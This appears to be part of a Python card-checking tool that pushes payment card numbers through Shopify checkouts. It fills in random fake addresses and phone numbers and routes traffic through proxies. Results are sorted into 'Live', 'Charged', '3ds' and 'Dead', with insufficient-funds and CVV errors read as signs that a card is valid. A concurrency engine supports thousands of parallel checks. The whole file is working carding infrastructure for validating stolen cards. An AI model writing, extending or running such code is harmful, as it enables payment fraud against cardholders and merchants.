                                        seller_m_lines = seller_merch.get('merchandiseLines') or []
                                        if seller_m_lines:
                                            new_currency = ((seller_m_lines[0].get('totalAmount') or {}).get('value') or {}).get('currencyCode')
                                
                                if new_currency:
                                    currency = new_currency
                                    submit_variables['input']['buyerIdentity']['customer']['presentmentCurrency'] = new_currency
                                    if 'value' in submit_variables['input']['payment']['paymentLines'][0]['amount']:
                                        submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['currencyCode'] = new_currency
                                    if 'totalAmount' in submit_variables['input']['payment'] and 'value' in submit_variables['input']['payment']['totalAmount']:
                                        submit_variables['input']['payment']['totalAmount']['value']['currencyCode'] = new_currency
                                    if 'value' in submit_variables['input']['taxes']['proposedTotalAmount']:
                                        submit_variables['input']['taxes']['proposedTotalAmount']['value']['currencyCode'] = new_currency
                                    if 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                                        if 'value' in submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['currencyCode'] = new_currency
                                    if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                                        if 'value' in submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']['value']['currencyCode'] = new_currency
                                
                                # Extract and update merchandise price if changed
                                new_merch_price = None
                                seller_merch = seller_prop.get('merchandise') or {}
                                if seller_merch:
                                    seller_m_lines = seller_merch.get('merchandiseLines') or []
                                    if seller_m_lines:
                                        new_merch_price = ((seller_m_lines[0].get('totalAmount') or {}).get('value') or {}).get('amount')
                                
                                if new_merch_price and 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                                    submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {'any': True}

                                new_running = ((seller_prop.get('runningTotal') or {}).get('value') or {}).get('amount')
                                new_tax_str = '0.00'
                                new_tax_data = seller_prop.get('tax') or {}
                                if new_tax_data and new_tax_data.get('__typename') == 'FilledTaxTerms':
                                    new_tax_str = ((new_tax_data.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0.00')
                                
                                new_strategy = ''
                                new_shipping_str = '0.00'
                                new_delivery_line_id = ''
                                new_dest_none = False
                                d_lines = None
                                new_delivery = seller_prop.get('delivery', {})
                                if new_delivery and new_delivery.get('__typename') == 'FilledDeliveryTerms':
                                    d_lines = new_delivery.get('deliveryLines', [])
                                    if d_lines:
                                        new_delivery_line_id = d_lines[0].get('id', '')
                                        sel_strat = d_lines[0].get('selectedDeliveryStrategy', {})
                                        if sel_strat:
                                            new_strategy = sel_strat.get('handle', '')
                                        
                                        avail_strats = d_lines[0].get('availableDeliveryStrategies') or []
                                        if avail_strats:
                                            try:
                                                def get_strat_price(s):
                                                    try:
                                                        return float(s.get('amount', {}).get('value', {}).get('amount', '0'))
                                                    except:
                                                        return 999999.0
                                                avail_strats = sorted(avail_strats, key=get_strat_price)
                                            except Exception:
                                                pass
                                            if not new_strategy:
                                                new_strategy = avail_strats[0].get('handle', '')
                                            for strat in avail_strats:
                                                if strat.get('handle') == new_strategy:
                                                    new_shipping_str = ((strat.get('amount') or {}).get('value') or {}).get('amount', '0.00')
                                                    break
                                            else:
                                                new_shipping_str = ((avail_strats[0].get('amount') or {}).get('value') or {}).get('amount', '0.00')
                                    else:
                                        # deliveryLines is empty in the proposal!
                                        new_strategy = None
                                else:
                                    new_strategy = None
                                
                                if new_running:
                                    if 'value' in submit_variables['input']['payment']['paymentLines'][0]['amount']:
                                        submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = new_running
                                    if 'totalAmount' in submit_variables['input']['payment']:
                                        submit_variables['input']['payment']['totalAmount'] = {'any': True}
                                    try:
                                        _r = get_exchange_rate(currency)
                                        orig_new_running = float(new_running)
                                        t_amt = round(orig_new_running * _r, 2)
                                        prod_usd = round(float(subtotal) * _r, 2)
                                        tax_usd = round(float(new_tax_str) * _r, 2)
                                        ship_usd = round(float(new_shipping_str) * _r, 2)

                                        parts = [f"Prod: ${prod_usd:.2f}"]
                                        if tax_usd > 0:
                                            parts.append(f"Tax: ${tax_usd:.2f}")
                                        if ship_usd > 0:
                                            parts.append(f"Ship: ${ship_usd:.2f}")
                                        detail = " | ".join(parts)
                                        if currency.upper() == "USD" or _r == 1.0:
                                            total_price = f"${t_amt:.2f} [{detail}]"
                                        else:
                                            total_price = f"${t_amt:.2f} ({orig_new_running:.2f} {currency}) [{detail}]"
                                    except Exception:
                                        t_amt = round(float(new_running), 2)
                                        total_price = f"${t_amt:.2f}"
                                
                                # High price abort check temporarily disabled
                                # if 't_amt' in locals() and t_amt > 15.0:
                                #     return False, f"Aborted: Checkout price spiked to ${t_amt} after retry (>$12)", gateway, total_price, currency

                                if 'value' in submit_variables['input']['taxes']['proposedTotalAmount']:
                                    submit_variables['input']['taxes']['proposedTotalAmount']['value']['amount'] = new_tax_str
                                
                                has_dest_req = False
                                for e in errors:
                                    code = e.get('code', '')
                                    if code == 'TAX_NEW_TAX_MUST_BE_ACCEPTED':
                                        try:
                                            sig = (seller_prop.get('nonNegotiableTerms') or {}).get('signature')
                                            if sig:
                                                submit_variables['input']['nonNegotiableTerms'] = {'signature': sig}
                                        except Exception:
                                            pass
                                    elif code == 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH':
                                        try:
                                            flex_id = ((seller_prop.get('payment') or {}).get('paymentFlexibilityPaymentTermsTemplate') or {}).get('id')
                                            if flex_id:
                                                submit_variables['input']['payment']['paymentLines'][0]['paymentFlexibilityTermsId'] = flex_id
                                        except (KeyError, IndexError, TypeError):
                                            pass
                                    elif code == 'DESTINATION_ADDRESS_REQUIRED':
                                        has_dest_req = True
                                        is_shipping_required = True
                                    elif code in ('MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE', 'PAYMENTS_ZONE_NOT_FOUND', 'PAYMENTS_POSTAL_CODE_REQUIRED'):
                                        _FALLBACK_CC = {
                                            'NZ': 'AU', 'AU': 'US', 'GB': 'US', 'DE': 'US',
                                            'FR': 'US', 'JP': 'US', 'IN': 'US', 'SG': 'US',
                                            'HK': 'US', 'CN': 'US', 'AE': 'US', 'CA': 'US',
                                            'SE': 'US', 'NO': 'US', 'DK': 'US', 'MX': 'US',
                                            'CH': 'US',
                                        }
                                        country_code = _FALLBACK_CC.get(country_code, 'US')
                                        address_info = book.get(country_code, book['US'])
                                        phone = generate_valid_phone(country_code, address_info.get('phone', ''))
                                        street = f"{address_info['address1']} Apt {random.randint(1, 999)}"
                                        city = address_info['city']
                                        state = address_info['zoneCode']
                                        s_zip = address_info['postalCode']
                                        has_dest_req = True
                                        is_shipping_required = True
                                        try:
                                            submit_variables['input']['buyerIdentity']['customer']['countryCode'] = country_code
                                            submit_variables['input']['buyerIdentity']['phoneCountryCode'] = country_code
                                            submit_variables['input']['buyerIdentity']['shopPayOptInPhone'] = {'number': phone, 'countryCode': country_code}
                                            submit_variables['input']['payment']['billingAddress']['streetAddress']['countryCode'] = country_code
                                            submit_variables['input']['payment']['billingAddress']['streetAddress']['zoneCode'] = state
                                            submit_variables['input']['payment']['billingAddress']['streetAddress']['phone'] = phone
                                        except Exception:
                                            pass
                                    elif code == 'WAITING_PENDING_TERMS':
                                        await asyncio.sleep(1.5)
                                    elif code in ('MISSING_CREDIT_CARD_SESSION_INFORMATION', 'PAYMENTS_CREDIT_CARD_SESSION_EXPIRED') or 'session' in (e.get('localizedMessage', '') or '').lower():
                                        try:
                                            _vr_resp = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
                                            _vr_data = await _vr_resp.json()
                                            _new_tok = _vr_data.get('id')
                                            if _new_tok:
                                                submit_variables['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = _new_tok
                                                token = _new_tok
                                        except Exception:
                                            pass
                                        
                                if new_strategy is None and not has_dest_req:
                                    if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                                        submit_variables['input']['delivery']['deliveryLines'] = []
                                        submit_variables['input']['delivery']['noDeliveryRequired'] = [{'stableId': stableId or '1'}]
                                elif 'deliveryLines' in submit_variables['input']['delivery']:
                                    if not submit_variables['input']['delivery']['deliveryLines'] or has_dest_req:
                                        new_line = {
                                            'targetMerchandiseLines': {
                                                'lines': [{'stableId': stableId or '1'}]
                                            },
                                            'deliveryMethodTypes': ['SHIPPING'],
                                            'expectedTotalPrice': {
                                                'value': {'amount': new_shipping_str, 'currencyCode': currency}
                                            },
                                            'destinationChanged': False
                                        }
                                        if street:
                                            new_line['destination'] = {
                                                'streetAddress': {
                                                    'address1': street, 'address2': address2 or '', 'city': city,
                                                    'countryCode': country_code, 'postalCode': s_zip,
                                                    'firstName': firstName, 'lastName': lastName,
                                                    'zoneCode': state, 'phone': phone
                                                }
                                            }
                                            if any(e.get('code') == 'DELIVERY_COMPANY_REQUIRED' for e in errors):
                                                new_line['destination']['streetAddress']['company'] = 'LLC'
                                        
                                        if has_dest_req:
                                            new_line['selectedDeliveryStrategy'] = {
                                                'deliveryStrategyMatchingConditions': {
                                                    'estimatedTimeInTransit': {'any': True},
                                                    'shipments': {'any': True}
                                                },
                                                'options': {}
                                            }
                                            new_line['destinationChanged'] = True
                                            new_line['expectedTotalPrice'] = {'any': True}
                                            
                                        submit_variables['input']['delivery']['deliveryLines'] = [new_line]
                                        submit_variables['input']['delivery']['noDeliveryRequired'] = []
                                    
                                    if not has_dest_req:
                                        sel_strategy = submit_variables['input']['delivery']['deliveryLines'][0].get('selectedDeliveryStrategy')
                                        if sel_strategy is None or 'deliveryStrategyByHandle' not in sel_strategy:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': new_strategy, 'customDeliveryRate': False}, 'options': {}}
                                        else:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy']['deliveryStrategyByHandle']['handle'] = new_strategy
                                        if 'value' in submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice']['value']['amount'] = new_shipping_str
                                    
                                    if any(e.get('code') == 'DELIVERY_COMPANY_REQUIRED' for e in errors):
                                        try:
                                            submit_variables['input']['delivery']['deliveryLines'][0]['destination']['streetAddress']['company'] = 'LLC'
                                        except (KeyError, IndexError):
                                            pass
                                
                                if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines'] and d_lines:
                                    if d_lines[0].get('destinationAddress') is None and not is_shipping_required:
                                        if 'destination' in submit_variables['input']['delivery']['deliveryLines'][0]:
                                            del submit_variables['input']['delivery']['deliveryLines'][0]['destination']

                                # Phone pattern mismatch recovery: mutate phone to alternate valid format
                                is_phone_err = any(
                                    e.get('code') in (
                                        'DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                        'PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                        'PHONE_NUMBER_INVALID',
                                        'DELIVERY_PHONE_NUMBER_INVALID',
                                        'BUYER_IDENTITY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                        'BILLING_ADDRESS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN'
                                    ) or 'phone' in (e.get('localizedMessage', '') or e.get('nonLocalizedMessage', '') or '').lower()
                                    for e in errors
                                )
                                if is_phone_err:
                                    phone = _get_alternate_phone(phone, country_code, attempt=attempt)
                                    try:
                                        d_lines = submit_variables['input']['delivery'].get('deliveryLines', [])
                                        for dl in d_lines:
                                            dest = dl.get('destination', {})
                                            if 'streetAddress' in dest:
                                                dest['streetAddress']['phone'] = phone
                                    except Exception:
                                        pass
                                    try:
                                        p_lines = submit_variables['input']['payment'].get('paymentLines', [])
                                        for pl in p_lines:
                                            b_addr = pl.get('paymentMethod', {}).get('directPaymentMethod', {}).get('billingAddress', {})
                                            if 'streetAddress' in b_addr:
                                                b_addr['streetAddress']['phone'] = phone
                                    except Exception:
                                        pass
                                    try:
                                        if 'billingAddress' in submit_variables['input']['payment']:
                                            submit_variables['input']['payment']['billingAddress']['streetAddress']['phone'] = phone
                                    except Exception:
                                        pass
                                    try:
                                        if 'buyerIdentity' in submit_variables['input']:
                                            if phone:
                                                submit_variables['input']['buyerIdentity']['shopPayOptInPhone'] = {'number': phone, 'countryCode': country_code}
                                            else:
                                                submit_variables['input']['buyerIdentity'].pop('shopPayOptInPhone', None)
                                    except Exception:
                                        pass
                                
                                await asyncio.sleep(0.2)
                                continue
                        
                        if errors:
                            for error in errors:
                                code = error.get('code', '')
                                localized_msg = (error.get('localizedMessage', '') or
                                                error.get('localizedMessageHtml', '') or
                                                error.get('nonLocalizedMessage', ''))
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and localized_msg:
                                    return False, localized_msg, gateway, total_price, currency
                                if code:
                                    if code == 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' or "total has changed" in localized_msg.lower():
                                        # Try extracting new amount from error or text if sellerProposal was missing
                                        _m_amt = re.search(r'"(?:runningTotal|totalAmount)"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"', text)
                                        if _m_amt and attempt < 3:
                                            new_amt = _m_amt.group(1)
                                            try:
                                                if 'value' in submit_variables['input']['payment']['paymentLines'][0]['amount']:
                                                    submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = new_amt
                                                if 'totalAmount' in submit_variables['input']['payment']:
                                                    submit_variables['input']['payment']['totalAmount'] = {'any': True}
                                                submit_variables['input']['taxes']['proposedTotalAmount'] = {'any': True}
                                                await asyncio.sleep(0.3)
                                                continue
                                            except Exception:
                                                pass
                                        return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                                    if code == 'REQUIRED_ARTIFACTS_UNAVAILABLE' and attempt < 2:
                                        await asyncio.sleep(1.0)
                                        continue
                                    if code == 'VALIDATION_CUSTOM' and localized_msg:
                                        return False, localized_msg, gateway, total_price, currency
                                    return False, code, gateway, total_price, currency
                                if localized_msg:
                                    return False, localized_msg, gateway, total_price, currency
                        if result_type == 'SubmitFailed':
                            return False, localized or extract_clean_response(reason) or "CARD_DECLINED", gateway, total_price, currency
                        return False, "CARD_DECLINED", gateway, total_price, currency
                    
                    receipt = submit_data.get('receipt', {})
                    if not receipt:
                        if result_type:
                            return False, f"No receipt in submit response (type: {result_type})", gateway, total_price, currency
                        return False, "No receipt in submit response", gateway, total_price, currency
                    
                    rid = receipt.get('id')
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency
                    break
                    
                except json.JSONDecodeError:
                    return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
                except Exception as e:
                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            # No initial sleep — start polling immediately
            for i in range(10):    # up to 10 polls, max ~2.0s total
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=0
                )

                if is_captcha_required(final_text):
                    return False, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json = json.loads(final_text)
                    receipt_data = (poll_json.get('data') or {}).get('receipt') or {}

                    if receipt_data:
                        typename = receipt_data.get('__typename', '')

                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                res_text = (msg or code or '').upper()
                                # Live card signals: insufficient funds or incorrect CVV means card is valid & alive
                                if any(kw in res_text for kw in ['INSUFFICIENT', 'CVV', 'CVC', 'SECURITY_CODE']):
                                    return True, msg or code or "INSUFFICIENT_FUNDS", gateway, total_price, currency
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return False, msg, gateway, total_price, currency
                                return False, code if code else 'CARD_DECLINED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'CARD_DECLINED'
                            res_text = str(code).upper()
                            if any(kw in res_text for kw in ['INSUFFICIENT', 'CVV', 'CVC', 'SECURITY_CODE']):
                                return True, code, gateway, total_price, currency
                            return False, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                            # Still processing — keep polling
                            await asyncio.sleep(0.2)
                            continue
                except Exception:
                    pass

                # Unknown receipt body — short wait then retry
                if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                    await asyncio.sleep(0.2)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            # Still in WaitingReceipt after all polls — treat as inconclusive DECLINED
            if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
                return False, "GATEWAY_TIMEOUT", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                receipt_obj = (res_json.get('data') or {}).get('receipt') or {}
                err_data = receipt_obj.get('processingError', {}) if receipt_obj else {}
                
                if err_data:
                    code = err_data.get('code')
                    msg = err_data.get('messageUntranslated')
                    res_text = ((msg or '') + ' ' + (code or '')).upper()
                    if any(kw in res_text for kw in ['INSUFFICIENT', 'CVV', 'CVC', 'SECURITY_CODE']):
                        return True, msg or code or "INSUFFICIENT_FUNDS", gateway, total_price, currency
                    if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '', None) and msg:
                        return False, msg, gateway, total_price, currency
                    if code:
                        return False, code, gateway, total_price, currency
                    return False, "CARD_DECLINED", gateway, total_price, currency
                
                if receipt_obj and receipt_obj.get('__typename') == 'ProcessedReceipt':
                    return True, "ORDER_PLACED", gateway, total_price, currency
                else:
                    return False, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return False, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Proxy Error: Unknown Result", gateway, total_price, currency

    except Exception as e:
        err_msg = str(e)
        err_lower = err_msg.lower()
        # DNS / offline site
        if "gaierror" in err_lower or "getaddrinfo" in err_lower or ("dns" in err_lower and "resolution" in err_lower):
            return False, "DNS resolution failed (site offline/invalid)", gateway, total_price, currency
        # Curl / network / proxy transient errors — treat as retryable proxy error
        if any(marker in err_lower for marker in _CURL_RETRY_ERRORS):
            return False, f"Proxy Error: {err_msg}", gateway, total_price, currency
        # Timeout errors
        if any(t in err_lower for t in ('timeout', 'timed out', 'time out', 'asyncio.timeout')):
            return False, f"Request Timeout: {err_msg}", gateway, total_price, currency
        return False, f"Error Processing Card: {err_msg}", gateway, total_price, currency

def parse_cc_string(cc_string):
    import re
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cvv_match = re.search(r'\d+', parts[3])
    if not cvv_match:
        raise ValueError("Invalid CC format. CVV must contain digits.")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': cvv_match.group(0)
    }

# ──────────────────────── Concurrency Engine ────────────────────────

MAX_CONCURRENT = 10000       # system-wide ceiling (all users combined)
_semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)
_user_semaphores = {}        # Dictionary mapping UID -> asyncio.Semaphore(100)
ACTIVE_WORKERS = 0           # tracks actual in-flight requests

async def _prune_user_semaphores():
    """Remove stale uid semaphores and site semaphores that no longer have waiters."""
    while True:
        await asyncio.sleep(60)  # Prune every 60s (was 300s)
        # Clean user semaphores
        to_delete = [uid for uid, sem in list(_user_semaphores.items()) if getattr(sem, '_value', 0) >= 100]
        for uid in to_delete:
            _user_semaphores.pop(uid, None)
        # Clean per-site semaphores not used in 10 minutes
        now = time.time()
        stale_sites = [d for d, ts in list(_PER_SITE_LAST_SEEN.items()) if now - ts > 600]
        async with _PER_SITE_LOCK if _PER_SITE_LOCK else asyncio.Lock():
            for d in stale_sites:
                _PER_SITE_SEMAPHORES.pop(d, None)
                _PER_SITE_LAST_SEEN.pop(d, None)
        # Prune expired / oversized variant cache entries
        try:
            prune_variant_cache()
        except Exception:
            pass
        # Force GC sweep to free unreferenced objects
        import gc
        gc.collect()


async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec=40, check_only=False, uid=None, bin_country=None):
    """Process a single card, guarded by the concurrency semaphore.
    
    ORDER_TOTAL_CHANGED means the checkout session token expired mid-flow
    (REQUIRED_ARTIFACTS_UNAVAILABLE). We fix this permanently by clearing
    the variant cache (forces a fresh session) and retrying the full checkout
    from scratch — up to 2 outer retries.
    """
    global _semaphore, _user_semaphores, ACTIVE_WORKERS
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        
    safe_uid = str(uid) if uid else "unknown"
    if safe_uid not in _user_semaphores:
        _user_semaphores[safe_uid] = asyncio.Semaphore(100)
        
    logger.debug(f"[{cc}] Acquired semaphores, waiting...")
    async with _semaphore:
        async with _user_semaphores[safe_uid]:
            ACTIVE_WORKERS += 1
            try:
                MAX_OUTER_RETRIES = 2
                for outer_attempt in range(MAX_OUTER_RETRIES + 1):
                    logger.debug(f"[{cc}] Calling process_card (outer attempt {outer_attempt + 1})...")
                    success, message, gateway, price, currency = await process_card(
                        cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid, bin_country=bin_country
                    )
                    # Bubble up CAPTCHA_REQUIRED, proxy errors, and ORDER_TOTAL_CHANGED immediately.
                    if not success and isinstance(message, str):
                        msg_upper = message.upper()
                        # If session expired, pop cache and retry on same site
                        if 'REQUIRED_ARTIFACTS_UNAVAILABLE' in msg_upper:
                            if outer_attempt < MAX_OUTER_RETRIES:
                                logger.debug(f"[{cc}] Retrying (attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1}): {str(message)[:80]}")
                                _VARIANT_CACHE.pop(normalize_cache_key(site_url), None)
                                await asyncio.sleep(0.4)
                                continue
                                
                        if ('CAPTCHA_REQUIRED' in msg_upper or
                            'ORDER_TOTAL_CHANGED' in msg_upper or
                            any(kw in message for kw in ('Proxy Error:', 'Request Timeout:', 'Proxy Error: Request failed'))):
                            return success, message, gateway, price, currency

                    return success, message, gateway, price, currency
                return success, message, gateway, price, currency
            finally:
                ACTIVE_WORKERS -= 1

def _build_result(cc_string, success, message, gateway, price, currency):

    clean_response = extract_clean_response(message)
    c_lower = clean_response.lower()

    is_site_error = False
    if not success:
        # Captcha / security challenges are always site/proxy errors — never expose to user
        if any(kw in (message or '').lower() for kw in ['captcha_required', 'captcha required', 'security check', 'challenge required']):
            is_site_error = True
        # Site/processor minimum amount errors — NOT the card's fault
        elif any(kw in (message or '').upper() for kw in [
            'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
            'PAYMENT_AMOUNT_TOO_SMALL',
            'MINIMUM_ORDER',
            'ORDER_TOTAL_CHANGED',
            'DYNAMIC_PRICING_UNSUPPORTED',
        ]):
            is_site_error = True
        elif any(kw in c_lower for kw in ['failed to fetch products', 'cart failed', 'dns resolution failed', 'proxy error', 'timeout', 'amount too small', 'minimum order', 'order total', 'required_artifacts_unavailable', 'payment method not available', 'shipping unavailable', 'purchase by itself', 'without response', 'failure in receiving']):
            is_site_error = True
        else:
            # Keywords that confirm it's a real card-level decline (not a site error)
            card_decline_keywords = [
                'decline', 'fail', 'fraud', 'hold', 'pickup', 'stolen', 'lost',
                'expiry', 'expired', 'insufficient', 'fund', 'limit',
                'format', 'mismatch', 'invalid', 'restricted', 'error_code',
                'payment_failed', 'card_declined', 'do not honor', 'not honor',
                'blocked', 'unauthorized', 'generic_error',
            ]
            # Keywords that confirm it's a successful transaction (not a site error)
            # Include CVV errors in success because it implies the card is alive but CVV was wrong
            success_keywords = ['placed', 'success', 'approved', 'order_placed', 'cvv', 'cvc', 'security code']
            if (
                not any(kw in c_lower for kw in card_decline_keywords)
                and not any(kw in c_lower for kw in success_keywords)
            ):
                is_site_error = True

    if is_site_error:
        status_val = 'SITE_ERROR'
    # 3DS / OTP check first (higher priority than dead)
    elif any(x in c_lower for x in ['otp_required', 'otp required', '3ds_required', '3d_secure', '3d secure', 'authentication_required', 'actionrequired', 'step_up', 'secure_3d', 'challenge_required', 'three_d_secure', 'three-d-secure', 'three_d', 'three d', 'authenticate_three_d_secure', 'challenge']):
        status_val = '3ds'
    # Live / Charged / Approved / Insufficient Funds / CVV check
    elif any(x in c_lower for x in ['order_placed', 'order placed', 'processedreceipt', 'charged', 'payment successful', 'payment_successful', 'order completed']) and not any(neg in c_lower for neg in ['not approved', 'unsuccessful', 'failed', 'declined', 'could not be', 'was not', 'invalid', 'error', 'fraud', 'rejected']):
        status_val = 'Charged'
    elif any(x in c_lower for x in ['cvv', 'cvc', 'security code', 'insufficient', 'approved', 'success']):
        status_val = 'Live'
    else:
        # Everything else including CARD_DECLINED, PAYMENT_FAILED, MISMATCHED_BILL, etc.
        status_val = 'Dead'

    return {
        "Gateway": gateway,
        "Price": str(price) if price else "0.00",
        "Response": clean_response,
        "RawResponse": str(message),
        "Status": status_val,
        "cc": cc_string,
        "Currency": currency or "USD"
    }


